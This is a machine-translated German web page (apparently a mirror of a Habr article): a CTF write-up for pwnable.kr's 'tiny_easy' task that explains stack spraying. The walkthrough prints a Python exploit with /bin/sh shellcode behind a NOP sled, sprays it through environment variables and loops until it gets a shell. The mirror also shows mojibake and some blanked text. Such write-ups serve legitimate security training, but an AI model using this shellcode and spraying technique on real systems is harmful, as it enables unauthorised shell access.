<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§πüèª ‚õëÔ∏è üòõ Probleml√∂sung mit pwnable.kr 27 - tiny_easy. Grundlegendes zum Stapelspritzen üì≥ üë®üèª‚ÄçüöÄ üç¨</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir die 27. Aufgabe von der Seite pwnable.kr l√∂sen und verstehen, was Stapelspritzen ist.
 
 Organisationsinformationen , - ,...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Probleml√∂sung mit pwnable.kr 27 - tiny_easy. Grundlegendes zum Stapelspritzen</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/487620/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Artikel werden wir die 27. Aufgabe von der Seite </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwnable.kr l√∂sen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> und verstehen, was </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Stapelspritzen</font></a><font style="vertical-align: inherit;"> ist.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organisationsinformationen</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L√∂sung f√ºr den tiny_easy Job</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Klicken Sie auf das Signatursymbol tyni_easy. Wir erhalten die Adresse und den Port f√ºr die Verbindung √ºber ssh. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q-/yl/dz/q-yldzq42gi-ljkee84njvphs04.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir sind √ºber SSH verbunden und sehen das Flag und das Programm bereits ohne Quellcode. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bj/er/jh/bjerjh8h3vd73sozoxr3wxlljsa.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Durch die √úberpr√ºfung der Datei stellen wir fest, dass sie keinen Schutz hat. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q1/yg/wz/q1ygwzjjb352ef6petoktqa9r-c.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Laden Sie das Programm auf den Disassembler herunter. Die Datei ist sehr klein und folgt nur wenigen Anweisungen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/7l/xs/nf7lxsmitan7fwcykpz9z8bzqlu.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zu Beginn extrahiert das Programm den Wert aus dem Stapel in das EAX-Register. Anschlie√üend extrahiert es einen weiteren Wert in EDX und √ºbertr√§gt die Steuerung an diese Adresse. Aber was befindet sich ganz am Anfang des Programms auf dem Stapel? In diesem Moment habe ich auf dem Stapel das gleiche argc (die Anzahl der Programmargumente), argv (ein Zeiger auf ein Array von Programmargumenten) und envp (ein Zeiger auf ein Array von Umgebungsvariablen).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/6q/xq/5f/6qxq5ff-fdfnlbchy7td30dybyo.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In EDX wird die Adresse also auf dem ersten Element des Arrays von Programmargumenten platziert, dh auf dem vollst√§ndigen Pfad zur ausf√ºhrbaren Datei! Wenn Sie versuchen, es als Code auszuf√ºhren, sollte die Anwendung daher abst√ºrzen. Wenn Sie √ºberpr√ºfen, dann stellt sich heraus. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3r/_z/kx/3r_zkxdcvrq8pv4yilpp6ijjpiu.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Stapelspritzen ist ein Angriff, bei dem Fehler im Speicher der Anwendung verwendet werden, wodurch die Anwendung gezwungen wird, Speicher f√ºr eine gro√üe Anzahl von Objekten zuzuweisen, die sch√§dlichen Code enthalten. Dies erh√∂ht die Wahrscheinlichkeit des Erfolgs eines Exploits, wodurch der Ausf√ºhrungsfluss auf eine bestimmte Position im Inneren √ºbertragen wird. Es ist wichtig zu verstehen, dass dieser Angriff ohne einen Exploit, mit dem Sie den Ausf√ºhrungsfluss √§ndern k√∂nnen, keinen Schaden anrichtet. Der Angriff basiert auf der Vorhersagbarkeit der Adresse im Prozessadressraum.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beim Erstellen eines Prozesses im Betriebssystem wird ein Adressraum f√ºr seine Anforderungen zugewiesen, in dem sich Benutzerdaten, ausf√ºhrbarer Code und einige Systeminformationen befinden, die vom jeweiligen Betriebssystem abh√§ngen. So werden im Stapelsegment Variablen mit einer automatischen Platzierungsklasse sowie Informationen gespeichert, die bei jedem Aufruf der Funktion gespeichert werden, z. B. statische Variablen und die R√ºcksprungadresse beim Aufruf der Funktion. Beim Stapelspritzen arbeiten wir mit Umgebungsvariablen, in denen sich der Exploit befindet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Auf diese Weise k√∂nnen wir den Shellcode in den Umgebungsvariablen auf dem Stapel anordnen. Aber wir werden viele NOP-Operationen vor ihm durchf√ºhren, da es unwahrscheinlich ist, dass wir genau an die richtige Adresse gelangen k√∂nnen.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> subprocess<font></font>
<font></font>
payload =  <span class="hljs-string">"\x90"</span>*<span class="hljs-number">4096</span> + <span class="hljs-string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da das Programm von der Adresse 0xff ****** ausgeht, nehmen wir die zuf√§llige Adresse f√ºr den Stapel aus dieser Umgebung, z. B. 0xffbbbbbbb.</font></font><br>
<pre><code class="python hljs">addr = <span class="hljs-string">"\xb0\xaf\xb5\xff"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt werden wir mit unserem Shellcode einige Umgebungsvariablen erstellen, sodass die Wahrscheinlichkeit, dass wir darauf zugreifen, h√∂her ist.</font></font><br>
<br>
<pre><code class="python hljs">envs = {}
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):  <font></font>
    envs[<span class="hljs-string">"env"</span>+str(i)] = payload</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und mehrmals f√ºhren wir das Programm mit unseren Parametern aus.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<font></font>
	p = subprocess.Popen([addr], executable=<span class="hljs-string">"/home/tiny_easy/tiny_easy"</span>, env=envs)<font></font>
	p.wait()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem wir den vollst√§ndigen Code ausgef√ºhrt haben, erhalten wir eine Shell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mf/pz/i7/mfpzi7o2iplbidzmwy9aqttkxmq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Weiter mehr ... Sie k√∂nnen sich uns </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">per Telegramm anschlie√üen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Stellen wir eine Community zusammen, in der es Menschen gibt, die sich in vielen Bereichen der IT auskennen. Dann k√∂nnen wir uns in Fragen der IT und der Informationssicherheit immer gegenseitig helfen.</font></font></div>
      
    </div><p class="reference-to-source js-reference-to-source">Source: https://habr.com/ru/post/undefined/</p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de487604/index.html">Kurznotizen des Programmierers einbetten: Abschnittsduplizierung im Speicher des Mikrocontrollers</a></li>
<li><a href="../de487606/index.html">Visualisierung von Spannungslinien und Bewegungen elektrostatischer Ladungen, Simulation der Planetenbewegung des Sonnensystems</a></li>
<li><a href="../de487610/index.html">RealWorld: aiohttp, Tortoise ORM</a></li>
<li><a href="../de487612/index.html">Einfaches Hinzuf√ºgen, L√∂schen und Umbenennen von Dateien und Zielen in CMake-Projekten</a></li>
<li><a href="../de487616/index.html">Erstellen eines benutzerdefinierten Elements mithilfe einer C # -Tabelle f√ºr Windows Form</a></li>
<li><a href="../de487622/index.html">Antipatterns f√ºr die Arbeit mit Datenbanken</a></li>
<li><a href="../de487626/index.html">Wie Parksensoren funktionieren und wie man ihn austrickst</a></li>
<li><a href="../de487628/index.html">Diagnose des Alterns anhand von 9 Kennzeichen der Alterungserscheinungen</a></li>
<li><a href="../de487630/index.html">Der einfachste Algorithmus zum Erstellen eines Feldpuzzles (Teil 1)</a></li>
<li><a href="../de487632/index.html">‚ÄûKollegen, atmen Sie leiser‚Äú: Warum uns B√ºrol√§rm verr√ºckt macht - wir diskutieren √ºber Forschung</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>